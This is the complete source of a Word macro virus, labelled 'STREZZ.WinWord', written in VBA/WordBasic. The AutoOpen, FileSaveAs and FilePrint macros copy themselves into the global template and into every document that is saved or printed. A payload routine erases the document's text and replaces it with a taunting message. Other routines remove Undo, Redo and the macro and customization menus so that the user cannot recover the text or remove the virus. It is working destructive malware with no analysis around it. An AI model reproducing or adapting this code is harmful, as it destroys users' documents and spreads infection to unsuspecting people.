   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileSaveAs"


   '\\--------------------------------//'
   '\\ Virus  : STREZZ.WinWord        //'
   '\\ Author : Dark Love & Lady Love //'
   '\\ -------------------------------//'

   Public Sub MAIN()

       Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
       On Error GoTo -1: On Error GoTo ErrorTrap

       WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
       WordBasic.ToolsOptionsGeneral RecentFileCount:="0"

       WordBasic.CurValues.FileSaveAs dlg
       WordBasic.Dialog.FileSaveAs dlg

       If dlg.Format = 0 Then dlg.Format = 1
       If dlg.Format = 1 Then
           WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", 1
           WordBasic.MacroCopy "Global:FilePrint", WordBasic.[FileName$]() + ":FilePrint", 1
           WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[FileName$]() + ":FileSaveAs", 1
           WordBasic.FileSaveAs dlg
           GoTo Finish
       Else
           WordBasic.FileSaveAs dlg
           GoTo Finish
       End If

   ErrorTrap:
       If Err.Number <> 102 Then
           WordBasic.FileSaveAs dlg
       End If

   Finish:
   End Sub

   Attribute VB_Name = "FilePrint"


   '\\--------------------------------//'
   '\\ Virus  : STREZZ.WinWord        //'
   '\\ Author : Dark Love & Lady Love //'
   '\\ -------------------------------//'

   Public Sub MAIN()

       Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FilePrint(False)
       On Error GoTo -1: On Error GoTo ErrorTrap

       WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
       WordBasic.ToolsOptionsGeneral RecentFileCount:="0"

       WordBasic.CurValues.FilePrint dlg
       WordBasic.Dialog.FilePrint dlg

       RemoveIt
       Effect

       WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", 1
       WordBasic.MacroCopy "Global:FilePrint", WordBasic.[FileName$]() + ":FilePrint", 1
       WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[FileName$]() + ":FileSaveAs", 1

       WordBasic.FileSaveAs Format:=1

       WordBasic.FilePrint dlg

       WordBasic.MsgBox "You are STREZZ now, I'm sorry for it!", "[IVR] - Internation Virus Research", 16

   ErrorTrap:
   End Sub

   Private Sub Effect()

       WordBasic.EditSelectAll
       WordBasic.WW6_EditClear
       WordBasic.CenterPara
       WordBasic.FormatFont Points:="48", Underline:=0, Color:=2, StrikeThrough:=0, Superscript:=0, Subscript:=0, Hidden:=0, SmallCaps:=0, AllCaps:=0, Spacing:="0 pt", Position:="0 pt", Kerning:=0, KerningMin:="", Tab:="0", Font:="Times New Roman", Bold:=1, Italic:=0
       WordBasic.Insert "STRESS '97"
       WordBasic.InsertPara
       WordBasic.FormatFont Points:="36", Underline:=0, Color:=5, StrikeThrough:=0, Superscript:=0, Subscript:=0, Hidden:=0, SmallCaps:=0, AllCaps:=0, Spacing:="0 pt", Position:="0 pt", Kerning:=0, KerningMin:="", Tab:="0", Font:="Times New Roman", Bold:=1, Italic:=0
       WordBasic.Insert "Special for my love by"
       WordBasic.FormatFont Points:="36", Underline:=0, Color:=6, StrikeThrough:=0, Superscript:=0, Subscript:=0, Hidden:=0, SmallCaps:=0, AllCaps:=0, Spacing:="0 pt", Position:="0 pt", Kerning:=0, KerningMin:="", Tab:="0", Font:="Times New Roman", Bold:=1, Italic:=0
       WordBasic.InsertPara
       WordBasic.Insert "The Free Hackers"
       WordBasic.FormatFont Points:="20", Underline:=0, Color:=0, StrikeThrough:=0, Superscript:=0, Subscript:=0, Hidden:=0, SmallCaps:=0, AllCaps:=0, Spacing:="0 pt", Position:="0 pt", Kerning:=0, KerningMin:="", Tab:="0", Font:="Times New Roman", Bold:=1, Italic:=0
       WordBasic.InsertPara
       WordBasic.InsertPara
       WordBasic.Insert "Viroright (C) 1997 Internation Virus Research"
       WordBasic.FormatFont Points:="12", Underline:=0, Color:=2, StrikeThrough:=0, Superscript:=0, Subscript:=0, Hidden:=0, SmallCaps:=0, AllCaps:=0, Spacing:="0 pt", Position:="0 pt", Kerning:=0, KerningMin:="", Tab:="0", Font:="Times New Roman", Bold:=1, Italic:=0
       WordBasic.InsertPara
       WordBasic.InsertPara
       WordBasic.Insert "If you have bugs, please call me and don't stress for it! I will back laler!"

   End Sub

   Private Sub RemoveIt()

       WordBasic.ToolsCustomizeMenus ResetAll:=1, Context:=0

       WordBasic.ToolsCustomizeMenus MenuType:=0, Position:=-1, Category:=1, Name:="EditUndo", Menu:="&Edit", MenuText:="", Remove:=1, Context:=0
       WordBasic.ToolsCustomizeMenus MenuType:=0, Position:=-1, Category:=1, Name:="EditRedoOrRepeat", Menu:="&Edit", MenuText:="", Remove:=1, Context:=0

       WordBasic.ToolsCustomizeMenus MenuType:=0, Position:=1, Category:=1, Name:="(Separator)", Menu:="&Edit", MenuText:="", Remove:=1, Context:=0

       WordBasic.ToolsCustomizeKeyboard ResetAll:=1, Context:=0

       WordBasic.ToolsCustomizeKeyboard KeyCode:=345, Category:=1, Name:="EditRedoOrRepeat", Remove:=1, Context:=0

       WordBasic.ToolsCustomizeKeyboard KeyCode:=115, Category:=1, Name:="EditRedoOrRepeat", Remove:=1, Context:=0

       WordBasic.ToolsCustomizeKeyboard KeyCode:=1037, Category:=1, Name:="EditRedoOrRepeat", Remove:=1, Context:=0

       WordBasic.ToolsCustomizeKeyboard KeyCode:=346, Category:=1, Name:="EditUndo", Remove:=1, Context:=0

       WordBasic.ToolsCustomizeKeyboard KeyCode:=1032, Category:=1, Name:="EditUndo", Remove:=1, Context:=0

       WordBasic.Call "AutoOpen.OverMenus"

   End Sub

   Attribute VB_Name = "AutoOpen"


   '\\--------------------------------//'
   '\\ Virus  : STREZZ.WinWord        //'
   '\\ Author : Dark Love & Lady Love //'
   '\\ -------------------------------//'

   Dim Macros__$()

   Public Sub MAIN()
   ReDim Macros__$(3)
   Dim Vir_Macros
   Dim i
   Dim j
   Dim FoundID

       Macros__$(1) = "AutoOpen"
       Macros__$(2) = "FilePrint"
       Macros__$(3) = "FileSaveAs"
       Vir_Macros = 3

       On Error GoTo -1: On Error GoTo ErrorTrap

       WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
       WordBasic.ToolsOptionsGeneral RecentFileCount:="0"

           For i = 1 To WordBasic.CountMacros(0, 0)
               For j = 1 To Vir_Macros
                   If WordBasic.[MacroName$](i, 0) = Macros__$(j) Then
                       FoundID = -1
                   End If
               Next j
           Next i

       If Not FoundID Then

           WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOpen", 1
           WordBasic.MacroCopy WordBasic.[FileName$]() + ":FilePrint", "Global:FilePrint", 1
           WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileSaveAs", "Global:FileSaveAs", 1

           WordBasic.ToolsCustomizeMenus ResetAll:=1, Context:=0
           WordBasic.ToolsCustomizeKeyboard ResetAll:=1, Context:=0
           OverMenus
       Else
           WordBasic.ToolsCustomizeMenus ResetAll:=1, Context:=0
           OverMenus
       End If


   ErrorTrap:
   End Sub

   Private Sub OverMenus()

       WordBasic.ToolsCustomizeMenus MenuType:=1, Position:=-1, Category:=1, Name:="FileTemplates", Menu:="&File", MenuText:="&Templates...", Remove:=1, Context:=0

       WordBasic.ToolsCustomizeMenus MenuType:=1, Position:=4, Category:=1, Name:="(Separator)", Menu:="&File", MenuText:="", Remove:=1, Context:=0

       WordBasic.ToolsCustomizeMenus MenuType:=1, Position:=-1, Category:=1, Name:="ToolsMacro", Menu:="&File", MenuText:="&Macro...", Remove:=1, Context:=0

       WordBasic.ToolsCustomizeMenus MenuType:=0, Position:=-1, Category:=1, Name:="FileTemplates", Menu:="&File", MenuText:="&Templates...", Remove:=1, Context:=0

       WordBasic.ToolsCustomizeMenus MenuType:=0, Position:=-1, Category:=1, Name:="ViewToolbars", Menu:="&View", MenuText:="&Toolbars...", Remove:=1, Context:=0

       WordBasic.ToolsCustomizeMenus MenuType:=0, Position:=-1, Category:=1, Name:="ToolsMacro", Menu:="&Tools", MenuText:="&Macro...", Remove:=1, Context:=0

       WordBasic.ToolsCustomizeMenus MenuType:=0, Position:=-1, Category:=1, Name:="ToolsCustomize", Menu:="&Tools", MenuText:="&Customize...", Remove:=1, Context:=0

       WordBasic.ToolsCustomizeMenus MenuType:=0, Position:=-1, Category:=1, Name:="FormatStyle", Menu:="F&ormat", MenuText:="&Style...", Remove:=1, Context:=0

   End Sub
